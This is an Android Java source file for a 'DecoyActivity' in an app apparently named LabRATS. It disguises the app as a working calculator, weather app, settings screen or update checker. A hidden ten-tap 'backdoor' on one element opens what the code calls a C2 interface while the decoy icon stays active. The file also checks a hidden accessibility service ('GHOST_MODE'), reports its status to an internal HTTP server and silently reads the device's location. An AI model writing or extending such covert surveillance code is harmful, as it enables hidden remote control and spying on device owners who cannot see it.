package com.labs.labrats;

import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

import androidx.appcompat.app.AppCompatActivity;

import java.util.Locale;

public class DecoyActivity extends AppCompatActivity {

    private ProgressBar progressBar;
    private Button btnCheckUpdate;
    private ImageView ivUpdateIcon;
    private View pseudoToast;
    private int clickCount = 0;
    private long lastClickTime = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        String componentName = getIntent().getComponent().getClassName();
        Log.d("DecoyActivity", "Launched via: " + componentName);

        if (componentName.contains("CalculatorAlias")) {
            setContentView(R.layout.activity_decoy_calculator);
            setupCalculator();
        } else if (componentName.contains("WeatherAlias")) {
            setContentView(R.layout.activity_decoy_weather);
            setupWeather();
        } else if (componentName.contains("SettingsAlias")) {
            setContentView(R.layout.activity_decoy_settings);
            setupSettings();
        } else {
            setContentView(R.layout.activity_decoy);
            setupUpdateDecoy();
        }
    }

    private void setupUpdateDecoy() {
        progressBar = findViewById(R.id.decoyProgress);
        btnCheckUpdate = findViewById(R.id.btnCheckUpdate);
        ivUpdateIcon = findViewById(R.id.ivUpdateIcon);
        pseudoToast = findViewById(R.id.pseudoToast);

        btnCheckUpdate.setOnClickListener(v -> {
            btnCheckUpdate.setEnabled(false);
            progressBar.setVisibility(View.VISIBLE);
            
            new Handler(getMainLooper()).postDelayed(() -> {
                progressBar.setVisibility(View.GONE);
                btnCheckUpdate.setEnabled(true);
                showPseudoToast();
            }, 3000);
        });

        ivUpdateIcon.setOnClickListener(v -> handleBackdoorClick());
    }

    private void setupCalculator() {
        TextView display = findViewById(R.id.calcDisplay);
        if (display == null) return;

        display.setOnClickListener(v -> handleBackdoorClick());

        View.OnClickListener listener = v -> {
            Button b = (Button) v;
            String text = b.getText().toString();
            String current = display.getText().toString();

            if (text.equals("C") || text.equals("AC")) {
                display.setText("0");
            } else if (text.equals("=")) {
                try {
                    if (current.contains("+")) {
                        String[] parts = current.split("\\+");
                        double res = Double.parseDouble(parts[0]) + Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("-")) {
                        String[] parts = current.split("-");
                        double res = Double.parseDouble(parts[0]) - Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("x")) {
                        String[] parts = current.split("x");
                        double res = Double.parseDouble(parts[0]) * Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    } else if (current.contains("/")) {
                        String[] parts = current.split("/");
                        double res = Double.parseDouble(parts[0]) / Double.parseDouble(parts[parts.length-1]);
                        display.setText(formatResult(res));
                    }
                } catch (Exception e) {
                    display.setText("0");
                }
            } else {
                if (current.equals("0") && !text.equals(".")) display.setText(text);
                else display.setText(current + text);
            }
        };

        android.view.ViewGroup root = (android.view.ViewGroup) display.getParent();
        findAndAttachButtons(root, listener);
    }

    private void findAndAttachButtons(android.view.ViewGroup parent, View.OnClickListener listener) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof Button) {
                v.setOnClickListener(listener);
            } else if (v instanceof android.view.ViewGroup) {
                findAndAttachButtons((android.view.ViewGroup) v, listener);
            }
        }
    }

    private String formatResult(double d) {
        if (d == (long) d) return String.format(Locale.US, "%d", (long) d);
        else return String.format(Locale.US, "%.2f", d);
    }

    private void setupWeather() {
        TextView cityTv = findViewById(R.id.weatherCity);
        if (cityTv != null) {
            String city = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getString("last_city", "New York");
            cityTv.setText(city);
            // BACKDOOR: Multi-tap on city name
            cityTv.setOnClickListener(v -> handleBackdoorClick());
            
            // Try to update city if possible
            updateCityName(cityTv);
        }

        LinearLayout mainInfo = findViewById(R.id.weatherMainInfo);
        if (mainInfo != null) {
            // Also add backdoor to the main info area (large text) to make it easier
            mainInfo.setOnClickListener(v -> {
                Log.d("DecoyActivity", "Weather manual refresh");
                v.animate().alpha(0.5f).setDuration(200).withEndAction(() -> v.animate().alpha(1.0f).setDuration(200).start()).start();
                handleBackdoorClick();
            });
        }
    }

    private void updateCityName(TextView cityTv) {
        if (androidx.core.content.ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            try {
                android.location.LocationManager lm = (android.location.LocationManager) getSystemService(android.content.Context.LOCATION_SERVICE);
                
                // Get best available location fix
                android.location.Location loc = null;
                java.util.List<String> providers = lm.getProviders(true);
                for (String provider : providers) {
                    android.location.Location l = lm.getLastKnownLocation(provider);
                    if (l == null) continue;
                    if (loc == null || l.getAccuracy() < loc.getAccuracy()) {
                        loc = l;
                    }
                }

                if (loc != null) {
                    android.location.Geocoder geocoder = new android.location.Geocoder(this, java.util.Locale.getDefault());
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.TIRAMISU) {
                        geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1, addresses -> {
                            if (!addresses.isEmpty() && addresses.get(0).getLocality() != null) {
                                String city = addresses.get(0).getLocality();
                                runOnUiThread(() -> cityTv.setText(city));
                                getSharedPreferences("LabRATSSettings", MODE_PRIVATE).edit().putString("last_city", city).apply();
                            }
                        });
                    } else {
                        java.util.List<android.location.Address> addresses = geocoder.getFromLocation(loc.getLatitude(), loc.getLongitude(), 1);
                        if (addresses != null && !addresses.isEmpty() && addresses.get(0).getLocality() != null) {
                            String city = addresses.get(0).getLocality();
                            cityTv.setText(city);
                            getSharedPreferences("LabRATSSettings", MODE_PRIVATE).edit().putString("last_city", city).apply();
                        }
                    }
                }
            } catch (Exception e) {
                Log.e("DecoyActivity", "City update failed: " + e.getMessage());
            }
        }
    }

    private void setupSettings() {
        TextView title = findViewById(R.id.settingsTitle);
        if (title != null) {
            // BACKDOOR: Multi-tap on "Settings" title
            title.setOnClickListener(v -> handleBackdoorClick());
        }

        // Attach interactivity to all settings items
        android.view.ViewGroup root = findViewById(android.R.id.content);
        if (root != null) {
            attachSettingsInteractivity(root);
        }
    }

    private void attachSettingsInteractivity(android.view.ViewGroup parent) {
        for (int i = 0; i < parent.getChildCount(); i++) {
            View v = parent.getChildAt(i);
            if (v instanceof TextView) {
                TextView tv = (TextView) v;
                String text = tv.getText().toString();
                
                // Identify list items (not headers/title)
                // Settings headers typically have smaller text or are all-caps
                if (!text.isEmpty() && !text.equals("Settings") && 
                    !text.equals("SYSTEM") && !text.equals("PRIVACY & SECURITY") &&
                    tv.getTextSize() > 45) {
                    
                    v.setOnClickListener(item -> {
                        Log.d("DecoyActivity", "Settings simulation: " + text);
                        // Simulate opening a sub-menu
                        View mainContent = findViewById(android.R.id.content);
                        if (mainContent != null) {
                            float originalAlpha = mainContent.getAlpha();
                            mainContent.animate().alpha(0.0f).setDuration(200).withEndAction(() -> {
                                new Handler(getMainLooper()).postDelayed(() -> {
                                    mainContent.animate().alpha(originalAlpha).setDuration(300).start();
                                    android.widget.Toast.makeText(this, "Simulating " + text + " interface...", android.widget.Toast.LENGTH_SHORT).show();
                                }, 100);
                            }).start();
                        }
                    });
                }
            } else if (v instanceof android.view.ViewGroup) {
                attachSettingsInteractivity((android.view.ViewGroup) v);
            }
        }
    }

    @Override
    protected void onResume() {
        super.onResume();
        // --- GHOST_HEALTH_CHECK ---
        if (AccessibilityCore.getInstance() == null) {
            Log.w("DecoyActivity", "GHOST_MODE: Accessibility service lost");
            LabRatsHttpServer.logActivity("INTEL_NOTICE: Accessibility service is offline");
        }
    }

    private void handleBackdoorClick() {
        long currentTime = System.currentTimeMillis();
        if (currentTime - lastClickTime < 500) {
            clickCount++;
            Log.d("DecoyActivity", "Backdoor progress: " + clickCount + "/10");
        } else {
            clickCount = 1;
        }
        lastClickTime = currentTime;

        if (clickCount >= 10) {
            Log.d("DecoyActivity", "Backdoor triggered! Bypassing cover to open C2.");
            
            // Just open the C2 interface without changing the launcher icon (mask stays active)
            Intent intent = new Intent(this, MainActivity.class);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            
            // Reset counter for next time and finish decoy to prevent backstack leaks
            clickCount = 0;
            finish();
        }
    }

    private void showPseudoToast() {
        if (pseudoToast == null) return;
        pseudoToast.setVisibility(View.VISIBLE);
        pseudoToast.setAlpha(0f);
        pseudoToast.animate().alpha(1f).setDuration(300).start();
        new Handler(getMainLooper()).postDelayed(() -> {
            pseudoToast.animate().alpha(0f).setDuration(300).withEndAction(() -> pseudoToast.setVisibility(View.GONE)).start();
        }, 2500);
    }
}
